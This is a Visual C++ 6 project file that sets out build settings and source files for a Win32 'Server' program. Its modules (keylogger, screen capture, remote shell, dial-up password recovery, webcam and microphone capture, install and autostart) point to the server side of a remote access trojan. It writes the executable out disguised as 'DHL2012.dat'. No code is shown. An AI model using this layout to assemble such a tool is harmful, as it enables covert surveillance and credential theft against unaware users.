# Microsoft Developer Studio Project File - Name="Server" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Server - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Server.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Server.mak" CFG="Server - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Server - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "Server - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Server - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 1
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MD /W4 /GX /Od /I "../common" /D "WIN32" /D "NDEBUG" /D "_MBCS" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x809 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 ../common/zlib/zlib.lib ../common/G729a.lib Shlwapi.lib MSVCRT.LIB /nologo /subsystem:windows /map /machine:I386 /nodefaultlib:"LIBCMT" /out:"../bin/Update/DHL2012.dat"
# SUBTRACT LINK32 /force

!ELSEIF  "$(CFG)" == "Server - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 1
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MT /W3 /GX /ZI /Od /I "../common" /D "WIN32" /D "NDEBUG" /D "_MBCS" /D "_DLL" /Fr /FD /GZ /c
# SUBTRACT CPP /YX /Yc /Yu
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 ../common/zlib/zlib.lib ../common/G729a.lib Shlwapi.lib MSVCRT.LIB /nologo /subsystem:windows /debug /machine:I386 /nodefaultlib:"LIBCMT" /out:"../bin/Update/DHL2012.dat" /pdbtype:sept

!ENDIF 

# Begin Target

# Name "Server - Win32 Release"
# Name "Server - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\AudioCode.cpp
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.cpp
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\install.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Manager.cpp
# End Source File
# Begin Source File

SOURCE=.\Myfunction.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Registry.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.cpp
# End Source File
# Begin Source File

SOURCE=.\common\SerManager.cpp
# End Source File
# Begin Source File

SOURCE=.\Server.cpp
# End Source File
# Begin Source File

SOURCE=.\Server.rc
# End Source File
# Begin Source File

SOURCE=.\common\ServerStart.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\until.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\WaveIn.cpp
# End Source File
# Begin Source File

SOURCE=.\common\WaveOut.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=..\common\AudioCode.h
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.h
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.h
# End Source File
# Begin Source File

SOURCE=..\common\CursorInfo.h
# End Source File
# Begin Source File

SOURCE=.\Declare.h
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.h
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.h
# End Source File
# Begin Source File

SOURCE=.\common\install.h
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.h
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.h
# End Source File
# Begin Source File

SOURCE=.\common\keylog.h
# End Source File
# Begin Source File

SOURCE=.\common\login.h
# End Source File
# Begin Source File

SOURCE=.\common\loop.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\common\Manager.h
# End Source File
# Begin Source File

SOURCE=.\Myfunction.h
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.h
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.h
# End Source File
# Begin Source File

SOURCE=.\common\Registry.h
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=.\common\SerManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ServerStart.h
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.h
# End Source File
# Begin Source File

SOURCE=.\common\until.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.h
# End Source File
# Begin Source File

SOURCE=..\common\VideoCodec.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.h
# End Source File
# Begin Source File

SOURCE=.\common\WaveIn.h
# End Source File
# Begin Source File

SOURCE=.\common\WaveOut.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\Server.ico
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
